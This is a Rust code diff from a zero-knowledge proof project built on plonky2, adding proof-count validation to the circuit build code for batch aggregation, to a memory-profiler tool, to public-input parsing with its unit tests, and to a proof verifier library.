         let agg_prover_only_bytes = prover_data
             .prover_only
             .to_bytes(&generator_serializer, common_data)
             .map_err(|e| anyhow!("Failed to serialize aggregated prover data: {}", e))?;
         write(
             output_path.join("private_batch_prover.bin"),
             agg_prover_only_bytes,
         )?;
         println!("Saved {}/private_batch_prover.bin", output_path.display());
     } else {
         println!("Skipping aggregated prover binary generation");
     }
     Ok(())
 }
 
 /// Prove a private batch consisting entirely of dummy leaf proofs.
 ///
 /// The resulting proof has `block_hash == 0` (the public-batch dummy sentinel),
 /// zeroed exit slots, and dummy-replaced nullifiers, and is used by the
 /// public-batch prover to pad partial batches. Requires `dummy_proof.bin`
 /// (the leaf dummy proof) from the same generation run.
 fn generate_dummy_private_batch_proof(
     circuit_data: &plonky2::plonk::circuit_data::CircuitData<F, C, D>,
     targets: &crate::private_batch::circuit::circuit_logic::PrivateBatchCircuitTargets,
     leaf_common: &CommonCircuitData<F, D>,
     bins_dir: &Path,
     num_leaf_proofs: usize,
 ) -> Result<Vec<u8>> {
     use plonky2::iop::witness::PartialWitness;
     use zk_circuits_common::utils::bytes_to_digest;
 
     println!("Generating dummy private-batch proof for public-batch padding...");
 
     let dummy_leaf_bytes = std::fs::read(bins_dir.join("dummy_proof.bin"))
         .with_context(|| format!("Failed to read {}/dummy_proof.bin", bins_dir.display()))?;
     let dummy_leaf = crate::dummy_proof::load_dummy_proof(dummy_leaf_bytes, leaf_common)
         .map_err(|e| anyhow!("Failed to deserialize dummy leaf proof: {}", e))?;
 
     let proofs = vec![dummy_leaf; num_leaf_proofs];
     let dummy_nullifier_pre_images: Vec<[F; 4]> = (0..num_leaf_proofs)
         .map(|_| bytes_to_digest(crate::dummy_proof::generate_random_nullifier_preimage()))
         .collect();
 
     let mut pw = PartialWitness::new();
     crate::private_batch::prover::fill_private_batch_witness(
         &mut pw,
         targets,
         &proofs,
         &dummy_nullifier_pre_images,
     )?;
 
     let proof = circuit_data
         .prove(pw)
         .map_err(|e| anyhow!("Failed to prove dummy private batch: {}", e))?;
     Ok(proof.to_bytes())
 }
 
 fn load_leaf_common_data(common_path: &Path) -> Result<CommonCircuitData<F, D>> {
     let gate_serializer = DefaultGateSerializer;
 
     let common_bytes = std::fs::read(common_path)
         .with_context(|| format!("Failed to read leaf common circuit file {:?}", common_path))?;
 
     CommonCircuitData::from_bytes(common_bytes, &gate_serializer).map_err(|e| {
         anyhow!(
             "Failed to deserialize leaf common circuit data from {:?}: {}",
             common_path,
             e
         )
     })
 }
 
 fn load_leaf_verifier_only_data(verifier_path: &Path) -> Result<VerifierOnlyCircuitData<C, D>> {
     let verifier_bytes = std::fs::read(verifier_path).with_context(|| {
         format!(
             "Failed to read leaf verifier circuit file {:?}",
             verifier_path
         )
     })?;
 
     VerifierOnlyCircuitData::from_bytes(verifier_bytes).map_err(|e| {
         anyhow!(
             "Failed to deserialize leaf verifier circuit data from {:?}: {}",
             verifier_path,
             e
         )
     })
 }

diff --git a/wormhole/aggregator/src/public_batch/circuit/build.rs b/wormhole/aggregator/src/public_batch/circuit/build.rs
--- a/wormhole/aggregator/src/public_batch/circuit/build.rs
+++ b/wormhole/aggregator/src/public_batch/circuit/build.rs
@@ -1,146 +1,149 @@
 //! Build + serialize public-batch aggregation circuit artifacts.
 //!
 //! Generates: `public_batch_common.bin`, `public_batch_verifier.bin`, `public_batch_prover.bin` (optional)
 //!
 //! Expects private-batch artifacts to already exist in `output_dir`.
 
 use anyhow::{anyhow, Context, Result};
 use std::fs::{create_dir_all, write};
 use std::path::Path;
 
 use plonky2::plonk::circuit_data::{
     CommonCircuitData, ProverCircuitData, VerifierCircuitData, VerifierOnlyCircuitData,
 };
 use plonky2::util::serialization::{DefaultGateSerializer, DefaultGeneratorSerializer};
+use qp_wormhole_inputs::ensure_proof_count;
 
 use zk_circuits_common::circuit::{wormhole_public_batch_circuit_config, C, D, F};
 
 use crate::common::utils::private_batch_num_leaves_from_padded_pi_len;
 use crate::public_batch::circuit::circuit_logic::PublicBatchCircuit;
 
 /// Build and write all public-batch artifacts into `output_dir`.
 pub fn generate_public_batch_circuit_binaries<P: AsRef<Path>>(
     output_dir: P,
     num_private_batch_proofs: usize,
     include_prover: bool,
 ) -> Result<()> {
+    ensure_proof_count(num_private_batch_proofs, "num_private_batch_proofs")?;
+
     let output_dir = output_dir.as_ref();
     create_dir_all(output_dir)
         .with_context(|| format!("Failed to create output dir {}", output_dir.display()))?;
 
     let private_batch_common = load_private_batch_common_from_bins(output_dir)
         .context("Failed to load private-batch common circuit data")?;
     let private_batch_verifier_only = load_private_batch_verifier_only_from_bins(output_dir)
         .context("Failed to load private-batch verifier data")?;
 
     let private_batch_num_leaves =
         private_batch_num_leaves_from_padded_pi_len(private_batch_common.num_public_inputs)?;
 
     // Non-ZK config: public-batch witnesses (private-batch proofs) are already public data and their
     // public inputs are forwarded verbatim, so blinding buys nothing and slows proving.
     let public_batch_circuit = PublicBatchCircuit::new(
         wormhole_public_batch_circuit_config(),
         private_batch_common,
         &private_batch_verifier_only,
         num_private_batch_proofs,
         private_batch_num_leaves,
     );
 
     let circuit_data = public_batch_circuit.build_circuit();
     let verifier_data = circuit_data.verifier_data();
     write_verifier_artifacts(output_dir, &verifier_data)?;
 
     if include_prover {
         let prover_data = circuit_data.prover_data();
         write_prover_artifact(output_dir, &prover_data)?;
     }
 
     println!(
         "Public-batch circuit artifacts written to {} (num_private_batch_proofs={}, private_batch_num_leaves={})",
         output_dir.display(),
         num_private_batch_proofs,
         private_batch_num_leaves
     );
 
     Ok(())
 }
 
 fn load_private_batch_common_from_bins(bins_dir: &Path) -> Result<CommonCircuitData<F, D>> {
     let gate_serializer = DefaultGateSerializer;
 
     let bytes = std::fs::read(bins_dir.join("private_batch_common.bin")).with_context(|| {
         format!(
             "Failed to read {}",
             bins_dir.join("private_batch_common.bin").display()
         )
     })?;
 
     CommonCircuitData::from_bytes(bytes, &gate_serializer)
         .map_err(|e| anyhow!("Failed to deserialize private_batch_common.bin: {}", e))
 }
 
 fn load_private_batch_verifier_only_from_bins(
     bins_dir: &Path,
 ) -> Result<VerifierOnlyCircuitData<C, D>> {
     let bytes = std::fs::read(bins_dir.join("private_batch_verifier.bin")).with_context(|| {
         format!(
             "Failed to read {}",
             bins_dir.join("private_batch_verifier.bin").display()
         )
     })?;
 
     VerifierOnlyCircuitData::from_bytes(bytes)
         .map_err(|e| anyhow!("Failed to deserialize private_batch_verifier.bin: {}", e))
 }
 
 fn write_verifier_artifacts(
     bins_dir: &Path,
     verifier_data: &VerifierCircuitData<F, C, D>,
 ) -> Result<()> {
     let gate_serializer = DefaultGateSerializer;
 
     let common_bytes = verifier_data
         .common
         .to_bytes(&gate_serializer)
         .map_err(|e| anyhow!("Failed to serialize public_batch common data: {}", e))?;
 
     let verifier_bytes = verifier_data
         .verifier_only
         .to_bytes()
         .map_err(|e| anyhow!("Failed to serialize public_batch verifier data: {}", e))?;
 
     write(bins_dir.join("public_batch_common.bin"), common_bytes).with_context(|| {
         format!(
             "Failed to write {}",
             bins_dir.join("public_batch_common.bin").display()
         )
     })?;
     write(bins_dir.join("public_batch_verifier.bin"), verifier_bytes).with_context(|| {
         format!(
             "Failed to write {}",
             bins_dir.join("public_batch_verifier.bin").display()
         )
     })?;
 
     Ok(())
 }
 
 fn write_prover_artifact(bins_dir: &Path, prover_data: &ProverCircuitData<F, C, D>) -> Result<()> {
     let generator_serializer = DefaultGeneratorSerializer::<C, D> {
         _phantom: Default::default(),
     };
 
     let prover_bytes = prover_data
         .prover_only
         .to_bytes(&generator_serializer, &prover_data.common)
         .map_err(|e| anyhow!("Failed to serialize public_batch prover data: {}", e))?;
 
     write(bins_dir.join("public_batch_prover.bin"), prover_bytes).with_context(|| {
         format!(
             "Failed to write {}",
             bins_dir.join("public_batch_prover.bin").display()
         )
     })?;
 
     Ok(())
 }

diff --git a/wormhole/memprof/src/main.rs b/wormhole/memprof/src/main.rs
--- a/wormhole/memprof/src/main.rs
+++ b/wormhole/memprof/src/main.rs
@@ -1,158 +1,162 @@
 //! Single-shot peak-memory profiler for the wormhole proof + aggregation
 //! pipeline.
 //!
 //! Runs the pipeline ONCE in a fresh process while a background thread samples
 //! resident memory, then prints a phase-by-phase peak-memory report. Use this
 //! to compare circuit configurations, runtime tuning (rayon thread count,
 //! batch sizes), and allocator behavior without firing up a full client.
 //!
 //! Pipeline phases:
 //!   1. build leaf circuit (once)
 //!   2. generate N leaf proofs sequentially (or skip & use dummies)
 //!   3. build the private-batch aggregation circuit
 //!   4. commit + prove the aggregation
 //!
 //! See `README.md` for usage examples.
 
 mod config;
 mod memory;
 mod report;
 mod workload;
 
 use anyhow::Result;
 use clap::Parser;
+use wormhole_aggregator::ensure_proof_count;
 
 use crate::config::{default_agg_config, default_leaf_config, print_config_summary, AggConfigArgs};
 use crate::report::PhaseReport;
 
 #[derive(Parser, Debug)]
 #[command(
     name = "wormhole-memprof",
     about = "Peak-memory profiler for wormhole proof + aggregation"
 )]
 struct Args {
     /// Number of leaf proofs the aggregation circuit is built for. Matches
     /// the on-chain verifier's expected batch size.
     #[arg(long, default_value_t = 7)]
     num_leaf_proofs: usize,
 
     /// How many real leaf proofs to actually generate before aggregation.
     /// Must be <= num_leaf_proofs. The aggregator pads the rest with dummy
     /// proofs.
     #[arg(long)]
     real_proofs: Option<usize>,
 
     /// Limit the rayon thread pool. `1` = single-threaded; `0` = system
     /// default. Useful for comparing parallel vs serial allocation patterns.
     #[arg(long, default_value_t = 0)]
     rayon_threads: usize,
 
     /// Skip leaf-proof generation entirely (use cloned dummy proof). Isolates
     /// the cost of the aggregation step alone.
     #[arg(long, default_value_t = false)]
     skip_leaf_gen: bool,
 
     /// Only build the aggregation circuit, don't prove anything. Reports the
     /// cost of the circuit data structure itself.
     #[arg(long, default_value_t = false)]
     circuit_only: bool,
 
     /// Call malloc_zone_pressure_relief between phases (Apple only).
     #[arg(long, default_value_t = false)]
     release_after_each: bool,
 
     /// Memory sampler poll period in milliseconds.
     #[arg(long, default_value_t = 25)]
     sample_period_ms: u64,
 
     /// If set, exits non-zero when overall peak exceeds this MB. CI guard.
     #[arg(long)]
     peak_target_mb: Option<u64>,
 
     #[command(flatten)]
     agg_cfg: AggConfigArgs,
 }
 
 fn main() -> Result<()> {
     let args = Args::parse();
     eprintln!("wormhole-memprof: args = {:#?}", args);
 
     if let Err(msg) = args.agg_cfg.validate() {
         eprintln!("ERROR: {}", msg);
         std::process::exit(2);
     }
 
     let agg_cfg = if args.agg_cfg.is_default() {
         default_agg_config()
     } else {
         args.agg_cfg.build()
     };
     let leaf_cfg = default_leaf_config();
     print_config_summary("leaf", &leaf_cfg);
     print_config_summary("agg", &agg_cfg);
 
     if args.rayon_threads > 0 {
         eprintln!("Configuring rayon with {} threads", args.rayon_threads);
         rayon::ThreadPoolBuilder::new()
             .num_threads(args.rayon_threads)
             .build_global()
             .map_err(|e| {
                 anyhow::anyhow!(
                     "failed to configure rayon thread pool with {} threads: {e}",
                     args.rayon_threads
                 )
             })?;
     }
 
-    let num_leaf_proofs = args.num_leaf_proofs;
-    let real_proofs = args.real_proofs.unwrap_or(num_leaf_proofs);
+    let num_leaf_proofs = ensure_proof_count(args.num_leaf_proofs, "num_leaf_proofs")?;
+    let real_proofs = ensure_proof_count(
+        args.real_proofs.unwrap_or(num_leaf_proofs),
+        "real_proofs",
+    )?;
     if real_proofs > num_leaf_proofs {
         anyhow::bail!(
             "--real-proofs ({}) must be <= --num-leaf-proofs ({})",
             real_proofs,
             num_leaf_proofs
         );
     }
 
     let mut report = PhaseReport::new(args.sample_period_ms)?;
 
     let leaf_ctx = workload::build_leaf_context(leaf_cfg.clone(), &mut report)?;
     if args.release_after_each {
         report.release_memory("after_build_leaf_circuit")?;
     }
 
     if args.circuit_only {
         workload::build_agg_circuit_only(&leaf_ctx, num_leaf_proofs, agg_cfg, &mut report)?;
         report.finish_and_print(args.peak_target_mb)?;
         return Ok(());
     }
 
     let mut leaf_proofs = Vec::with_capacity(real_proofs);
     if args.skip_leaf_gen {
         eprintln!(
             "Skipping leaf-proof generation; cloning dummy proof {} times",
             real_proofs
         );
         for _ in 0..real_proofs {
             leaf_proofs.push(leaf_ctx.dummy_proof.clone());
         }
     } else {
         for i in 0..real_proofs {
             let p =
                 workload::generate_leaf_proof(&leaf_ctx, i, args.release_after_each, &mut report)?;
             leaf_proofs.push(p);
         }
     }
 
     let _agg = workload::aggregate_fresh(
         &leaf_ctx,
         leaf_proofs,
         num_leaf_proofs,
         agg_cfg,
         args.release_after_each,
         &mut report,
     )?;
 
     report.finish_and_print(args.peak_target_mb)?;
     Ok(())
 }

diff --git a/wormhole/circuit/src/inputs.rs b/wormhole/circuit/src/inputs.rs
--- a/wormhole/circuit/src/inputs.rs
+++ b/wormhole/circuit/src/inputs.rs
@@ -1,319 +1,323 @@
 #![allow(clippy::new_without_default)]
 use crate::block_header::header::DIGEST_LOGS_SIZE;
 use alloc::vec::Vec;
 use anyhow::{bail, Context};
 use plonky2::field::goldilocks_field::GoldilocksField;
 use plonky2::field::types::PrimeField64;
 use plonky2::plonk::proof::ProofWithPublicInputs;
+use qp_wormhole_inputs::ensure_proof_count;
 use zk_circuits_common::circuit::{C, D, F};
 use zk_circuits_common::utils::{try_4_felts_to_bytes, BytesDigest};
 use zk_circuits_common::zk_merkle::SIBLINGS_PER_LEVEL;
 
 // Import public input types and constants from wormhole_inputs (single source of truth)
 pub use qp_wormhole_inputs::{
     BlockData, PrivateBatchPublicInputs, PublicCircuitInputs, PublicInputsByAccount,
 };
 use qp_wormhole_inputs::{
     ASSET_ID_INDEX, BLOCK_HASH_END_INDEX, BLOCK_HASH_START_INDEX, BLOCK_NUMBER_INDEX,
     EXIT_ACCOUNT_1_END_INDEX, EXIT_ACCOUNT_1_START_INDEX, EXIT_ACCOUNT_2_END_INDEX,
     EXIT_ACCOUNT_2_START_INDEX, NULLIFIER_END_INDEX, NULLIFIER_START_INDEX, OUTPUT_AMOUNT_1_INDEX,
     OUTPUT_AMOUNT_2_INDEX, PUBLIC_INPUTS_FELTS_LEN, VOLUME_FEE_BPS_INDEX,
 };
 
 /// Inputs required to commit to the wormhole circuit.
 #[derive(Debug, Clone)]
 pub struct CircuitInputs {
     pub public: PublicCircuitInputs,
     pub private: PrivateCircuitInputs,
 }
 
 /// All of the private inputs required for the circuit.
 #[derive(Debug, Clone)]
 pub struct PrivateCircuitInputs {
     /// Raw bytes of the secret of the nullifier and the unspendable account
     pub secret: BytesDigest,
     /// Transfer count for this recipient
     pub transfer_count: u64,
     /// The unspendable account hash (recipient of the transfer).
     pub unspendable_account: BytesDigest,
     /// The parent hash of the block header (private - used to compute block_hash)
     pub parent_hash: BytesDigest,
     /// The state root of the block (still needed for block hash computation)
     pub state_root: BytesDigest,
     /// The extrinsics root of the block header
     pub extrinsics_root: BytesDigest,
     /// The digest logs of the block header
     pub digest: [u8; DIGEST_LOGS_SIZE],
     /// The input amount from storage (before fee deduction). This value is quantized with 0.01 units of precision.
     /// The circuit verifies that output_amount <= input_amount - (input_amount * volume_fee_bps / 10000).
     pub input_amount: u32,
 
     // === ZK Merkle Proof fields (replaces old MPT storage_proof) ===
     /// Root of the ZK tree (from block header's zk_tree_root field).
     /// This is used for both:
     /// - Block hash computation (as part of the header preimage)
     /// - ZK Merkle proof verification (compared against computed root)
     ///
     /// The circuit constrains these two uses to be equal.
     pub zk_tree_root: [u8; 32],
     /// Sibling hashes at each level of the 4-ary Merkle proof.
     /// Each level has 3 siblings in **sorted order** (excluding current hash).
     pub zk_merkle_siblings: Vec<[[u8; 32]; SIBLINGS_PER_LEVEL]>,
     /// Position hints (0-3) for each level indicating where current hash
     /// should be inserted among the sorted siblings.
     pub zk_merkle_positions: Vec<u8>,
 }
 
 // ============================================================================
 // Traits for parsing from GoldilocksField slices (plonky2-specific)
 // ============================================================================
 
 /// Trait for parsing `PublicCircuitInputs` from field element slices.
 pub trait ParsePublicInputs {
     /// Parse public inputs from a slice of GoldilocksField elements.
     fn try_from_felts(pis: &[GoldilocksField]) -> anyhow::Result<PublicCircuitInputs>;
 
     /// Parse public inputs from a ProofWithPublicInputs.
     fn try_from_proof(
         proof: &ProofWithPublicInputs<F, C, D>,
     ) -> anyhow::Result<PublicCircuitInputs>;
 }
 
 impl ParsePublicInputs for PublicCircuitInputs {
     fn try_from_felts(pis: &[GoldilocksField]) -> anyhow::Result<PublicCircuitInputs> {
         // Public inputs are ordered as follows (total 21 felts):
         // asset_id: 1 felt
         // output_amount_1: 1 felt (spend)
         // output_amount_2: 1 felt (change)
         // volume_fee_bps: 1 felt
         // Nullifier.hash: 4 felts
         // ExitAccount1.address: 4 felts (8 bytes/felt for hash-derived accounts)
         // ExitAccount2.address: 4 felts (8 bytes/felt for hash-derived accounts)
         // BlockHeader.block_hash: 4 felts
         // BlockHeader.block_number: 1 felt
         if pis.len() != PUBLIC_INPUTS_FELTS_LEN {
             bail!(
                 "public inputs should contain: {} field elements, got: {}",
                 PUBLIC_INPUTS_FELTS_LEN,
                 pis.len()
             )
         }
         let asset_id = pis[ASSET_ID_INDEX]
             .to_canonical_u64()
             .try_into()
             .context("failed to convert asset_id felt to u32")?;
         let output_amount_1 = pis[OUTPUT_AMOUNT_1_INDEX]
             .to_canonical_u64()
             .try_into()
             .context("failed to convert output_amount_1 felt to u32")?;
         let output_amount_2 = pis[OUTPUT_AMOUNT_2_INDEX]
             .to_canonical_u64()
             .try_into()
             .context("failed to convert output_amount_2 felt to u32")?;
         let volume_fee_bps = pis[VOLUME_FEE_BPS_INDEX]
             .to_canonical_u64()
             .try_into()
             .context("failed to convert volume_fee_bps felt to u32")?;
         let nullifier = try_4_felts_to_bytes(&pis[NULLIFIER_START_INDEX..NULLIFIER_END_INDEX])
             .context("failed to deserialize nullifier hash")?;
         let block_hash = try_4_felts_to_bytes(&pis[BLOCK_HASH_START_INDEX..BLOCK_HASH_END_INDEX])
             .context("failed to deserialize block hash")?;
 
         let exit_account_1 =
             try_4_felts_to_bytes(&pis[EXIT_ACCOUNT_1_START_INDEX..EXIT_ACCOUNT_1_END_INDEX])
                 .context("failed to deserialize exit_account_1")?;
         let exit_account_2 =
             try_4_felts_to_bytes(&pis[EXIT_ACCOUNT_2_START_INDEX..EXIT_ACCOUNT_2_END_INDEX])
                 .context("failed to deserialize exit_account_2")?;
         let block_number_felt = pis[BLOCK_NUMBER_INDEX];
         let block_number = block_number_felt
             .to_canonical_u64()
             .try_into()
             .context("failed to convert block number felt to u32")?;
 
         Ok(PublicCircuitInputs {
             asset_id,
             output_amount_1,
             output_amount_2,
             volume_fee_bps,
             nullifier,
             block_hash,
             exit_account_1,
             exit_account_2,
             block_number,
         })
     }
 
     fn try_from_proof(
         proof: &ProofWithPublicInputs<F, C, D>,
     ) -> anyhow::Result<PublicCircuitInputs> {
         Self::try_from_felts(&proof.public_inputs)
             .context("failed to deserialize public inputs from proof")
     }
 }
 
 /// Trait for parsing `PrivateBatchPublicInputs` from field element slices.
 pub trait ParsePrivateBatchPublicInputs {
     /// Parse aggregated public inputs from a slice of GoldilocksField elements.
     fn try_from_felts(pis: &[GoldilocksField]) -> anyhow::Result<PrivateBatchPublicInputs>;
 }
 
 impl ParsePrivateBatchPublicInputs for PrivateBatchPublicInputs {
     fn try_from_felts(pis: &[GoldilocksField]) -> anyhow::Result<PrivateBatchPublicInputs> {
         // Layout: [num_unique_exits, asset_id, volume_fee_bps, block_hash(4), block_number,
         //          [output_sum(1), exit_account(4)] * 2*N, nullifiers(4) * N, padding...]
 
         // Validate layout: total length must be 8 + N * PUBLIC_INPUTS_FELTS_LEN
         let payload_len = pis
             .len()
             .checked_sub(8)
             .filter(|len| len % PUBLIC_INPUTS_FELTS_LEN == 0)
             .ok_or_else(|| {
                 anyhow::anyhow!(
                     "AggregatedPI: malformed length {} - expected 8 + N*{} felts",
                     pis.len(),
                     PUBLIC_INPUTS_FELTS_LEN
                 )
             })?;
 
         let n_leaf = payload_len / PUBLIC_INPUTS_FELTS_LEN;
         // This invariant is enforced because an aggregator should never legitimately
         // produce a PI vector with zero leaf proofs. See audit finding M-3: "Public-batch
         // has no dummy bypass; all-dummy private-batch batches break aggregation".
-        anyhow::ensure!(n_leaf > 0, "AggregatedPI: need at least one leaf proof");
+        if n_leaf == 0 {
+            bail!("AggregatedPI: need at least one leaf proof");
+        }
+        ensure_proof_count(n_leaf, "n_leaf")?;
 
         // Helper to read a u32 from a felt
         let read_u32 = |f: GoldilocksField| -> anyhow::Result<u32> {
             f.to_canonical_u64().try_into().map_err(Into::into)
         };
 
         // Helper to read 4 felts as a BytesDigest
         let read_digest = |slice: &[GoldilocksField]| -> anyhow::Result<BytesDigest> {
             try_4_felts_to_bytes(slice).context("failed to deserialize digest")
         };
 
         // Parse header (indices 0-7)
         let num_unique_exits = read_u32(pis[0]).context("num_unique_exits")?;
         let asset_id = read_u32(pis[1]).context("asset_id")?;
         let volume_fee_bps = read_u32(pis[2]).context("volume_fee_bps")?;
         let block_data = BlockData {
             block_hash: read_digest(&pis[3..7]).context("block_hash")?,
             block_number: read_u32(pis[7]).context("block_number")?,
         };
 
         // Parse 2*N exit accounts (after header at index 8)
         let account_data = pis[8..]
             .chunks(5)
             .take(n_leaf * 2)
             .enumerate()
             .map(|(i, chunk)| {
                 Ok(PublicInputsByAccount {
                     summed_output_amount: read_u32(chunk[0])
                         .with_context(|| format!("account[{}].amount", i))?,
                     exit_account: read_digest(&chunk[1..5])
                         .with_context(|| format!("account[{}].address", i))?,
                 })
             })
             .collect::<anyhow::Result<Vec<_>>>()?;
 
         // Parse N nullifiers (after exit accounts)
         let nullifier_start = 8 + n_leaf * 2 * 5;
         let nullifiers = pis[nullifier_start..]
             .chunks(4)
             .take(n_leaf)
             .enumerate()
             .map(|(i, chunk)| read_digest(chunk).with_context(|| format!("nullifier[{}]", i)))
             .collect::<anyhow::Result<Vec<_>>>()?;
 
         Ok(PrivateBatchPublicInputs {
             num_unique_exits,
             asset_id,
             volume_fee_bps,
             block_data,
             account_data,
             nullifiers,
         })
     }
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
     use plonky2::field::goldilocks_field::GoldilocksField;
     use plonky2::field::types::Field;
 
     #[test]
     fn aggregated_try_from_felts_rejects_empty_slice() {
         let result =
             <PrivateBatchPublicInputs as ParsePrivateBatchPublicInputs>::try_from_felts(&[]);
         assert!(result.is_err());
         let err_msg = result.unwrap_err().to_string();
         assert!(
             err_msg.contains("malformed length"),
             "Expected 'malformed length' error, got: {}",
             err_msg
         );
     }
 
     #[test]
     fn aggregated_try_from_felts_rejects_short_slice() {
         // Only 5 elements when at least 8 are required for header
         let short_slice: Vec<GoldilocksField> = vec![GoldilocksField::ZERO; 5];
         let result = <PrivateBatchPublicInputs as ParsePrivateBatchPublicInputs>::try_from_felts(
             &short_slice,
         );
         assert!(result.is_err());
         let err_msg = result.unwrap_err().to_string();
         assert!(
             err_msg.contains("malformed length"),
             "Expected 'malformed length' error, got: {}",
             err_msg
         );
     }
 
     #[test]
     fn aggregated_try_from_felts_rejects_malformed_length() {
         // 9 elements: 8 header + 1 extra (not a multiple of PUBLIC_INPUTS_FELTS_LEN)
         let malformed_slice: Vec<GoldilocksField> = vec![GoldilocksField::ZERO; 9];
         let result = <PrivateBatchPublicInputs as ParsePrivateBatchPublicInputs>::try_from_felts(
             &malformed_slice,
         );
         assert!(result.is_err());
         let err_msg = result.unwrap_err().to_string();
         assert!(
             err_msg.contains("malformed length"),
             "Expected 'malformed length' error, got: {}",
             err_msg
         );
     }
 
     #[test]
     fn aggregated_try_from_felts_rejects_header_only() {
         // Exactly 8 elements (header only, n_leaf would be 0)
         let header_only: Vec<GoldilocksField> = vec![GoldilocksField::ZERO; 8];
         let result = <PrivateBatchPublicInputs as ParsePrivateBatchPublicInputs>::try_from_felts(
             &header_only,
         );
         assert!(result.is_err());
         let err_msg = result.unwrap_err().to_string();
         assert!(
             err_msg.contains("at least one leaf"),
             "Expected 'at least one leaf' error, got: {}",
             err_msg
         );
     }
 
     #[test]
     fn aggregated_try_from_felts_accepts_valid_input() {
         // Valid input: 8 header + 21 (one leaf worth of data)
         let valid_slice: Vec<GoldilocksField> =
             vec![GoldilocksField::ZERO; 8 + PUBLIC_INPUTS_FELTS_LEN];
         let result = <PrivateBatchPublicInputs as ParsePrivateBatchPublicInputs>::try_from_felts(
             &valid_slice,
         );
         assert!(result.is_ok(), "Expected valid input to parse successfully");
         let parsed = result.unwrap();
         assert_eq!(parsed.account_data.len(), 2); // 2 outputs per leaf
         assert_eq!(parsed.nullifiers.len(), 1); // 1 nullifier per leaf
     }
 }

diff --git a/wormhole/verifier/src/lib.rs b/wormhole/verifier/src/lib.rs
--- a/wormhole/verifier/src/lib.rs
+++ b/wormhole/verifier/src/lib.rs
@@ -1,147 +1,149 @@
 //! Verifier logic for the Wormhole circuit.
 //!
 //! This module provides the [`WormholeVerifier`] type, which allows for the verification of
 //! zero-knowledge proofs generated by the Wormhole circuit.
 //!
 //! The typical usage flow involves:
 //! 1. Initializing the verifier from pre-built circuit data via [`WormholeVerifier::new_from_bytes()`].
 //! 2. Deserializing a [`ProofWithPublicInputs`].
 //! 3. Verifying the proof using [`WormholeVerifier::verify`].
 //!
 //! # Example
 //!
 //! ```ignore
 //! use qp_wormhole_verifier::{WormholeVerifier, ProofWithPublicInputs, C, D, F};
 //!
 //! // Load verifier from pre-serialized bytes
 //! let verifier = WormholeVerifier::new_from_bytes(verifier_bytes, common_bytes)?;
 //!
 //! // Deserialize the proof
 //! let proof = ProofWithPublicInputs::<F, C, D>::from_bytes(proof_bytes, &verifier.circuit_data.common)?;
 //!
 //! // Verify
 //! verifier.verify(proof)?;
 //! ```
 #![cfg_attr(not(feature = "std"), no_std)]
 
 #[cfg(not(feature = "std"))]
 extern crate alloc;
 
 #[cfg(not(feature = "std"))]
 use alloc::vec::Vec;
 #[cfg(feature = "std")]
 use std::vec::Vec;
 
 use anyhow::anyhow;
 #[cfg(feature = "std")]
 use std::path::Path;
 
 // Re-export types from qp-plonky2-verifier
 pub use qp_plonky2_verifier::{
     CommonCircuitData, ProofWithPublicInputs, VerifierCircuitData, VerifierOnlyCircuitData, C, D, F,
 };
 
 use qp_plonky2_verifier::field::types::PrimeField64;
 use qp_plonky2_verifier::util::serialization::DefaultGateSerializer;
 
 // Re-export input types from qp-wormhole-inputs
 pub use qp_wormhole_inputs::{
-    BlockData, BytesDigest, PrivateBatchPublicInputs, PublicBatchPublicInputs, PublicCircuitInputs,
-    PublicInputsByAccount,
+    ensure_public_batch_dimensions, BlockData, BytesDigest, PrivateBatchPublicInputs,
+    PublicBatchPublicInputs, PublicCircuitInputs, PublicInputsByAccount,
 };
 
 /// Parse public inputs from a proof.
 pub fn parse_public_inputs(
     proof: &ProofWithPublicInputs<F, C, D>,
 ) -> anyhow::Result<PublicCircuitInputs> {
     let u64s: Vec<u64> = proof
         .public_inputs
         .iter()
         .map(|f| f.to_canonical_u64())
         .collect();
     PublicCircuitInputs::try_from_u64_slice(&u64s)
 }
 
 /// Parse aggregated public inputs from a proof.
 pub fn parse_private_batch_public_inputs(
     proof: &ProofWithPublicInputs<F, C, D>,
 ) -> anyhow::Result<PrivateBatchPublicInputs> {
     let u64s: Vec<u64> = proof
         .public_inputs
         .iter()
         .map(|f| f.to_canonical_u64())
         .collect();
     PrivateBatchPublicInputs::try_from_u64_slice(&u64s)
 }
 
 /// Parse public-batch public inputs from a proof.
 pub fn parse_public_batch_public_inputs(
     proof: &ProofWithPublicInputs<F, C, D>,
     num_private_batch_proofs: usize,
     num_leaf_proofs: usize,
 ) -> anyhow::Result<PublicBatchPublicInputs> {
+    let (num_private_batch_proofs, num_leaf_proofs) =
+        ensure_public_batch_dimensions(num_private_batch_proofs, num_leaf_proofs)?;
     let u64s: Vec<u64> = proof
         .public_inputs
         .iter()
         .map(|f| f.to_canonical_u64())
         .collect();
     PublicBatchPublicInputs::try_from_u64_slice(&u64s, num_private_batch_proofs, num_leaf_proofs)
 }
 
 /// Verifier for Wormhole circuit proofs.
 ///
 /// This struct wraps the circuit verification data and provides methods to verify proofs.
 #[derive(Debug)]
 pub struct WormholeVerifier {
     pub circuit_data: VerifierCircuitData<F, C, D>,
 }
 
 impl WormholeVerifier {
     /// Creates a new [`WormholeVerifier`] from verifier and common data bytes.
     pub fn new_from_bytes(verifier_bytes: &[u8], common_bytes: &[u8]) -> anyhow::Result<Self> {
         let verifier_only = VerifierOnlyCircuitData::from_bytes(verifier_bytes.to_vec())
             .map_err(|e| anyhow!("failed to deserialize verifier data: {}", e))?;
 
         let common = CommonCircuitData::from_bytes(common_bytes.to_vec(), &DefaultGateSerializer)
             .map_err(|e| anyhow!("failed to deserialize common circuit data: {}", e))?;
 
         let circuit_data = VerifierCircuitData {
             verifier_only,
             common,
         };
 
         Ok(Self { circuit_data })
     }
 
     /// Creates a new [`WormholeVerifier`] from a verifier and common data files.
     #[cfg(feature = "std")]
     pub fn new_from_files(
         verifier_data_path: &Path,
         common_data_path: &Path,
     ) -> anyhow::Result<Self> {
         let verifier_bytes = std::fs::read(verifier_data_path)?;
         let common_bytes = std::fs::read(common_data_path)?;
 
         Self::new_from_bytes(&verifier_bytes, &common_bytes)
     }
 
     /// Verify a [`ProofWithPublicInputs`].
     ///
     /// # Errors
     ///
     /// Returns an error if the proof is not valid.
     pub fn verify_ref(&self, proof: &ProofWithPublicInputs<F, C, D>) -> anyhow::Result<()> {
         self.circuit_data
             .verify(proof.clone())
             .map_err(|e| anyhow!("proof verification failed: {}", e))
     }
 
     /// Verify a [`ProofWithPublicInputs`].
     ///
     /// # Errors
     ///
     /// Returns an error if the proof is not valid.
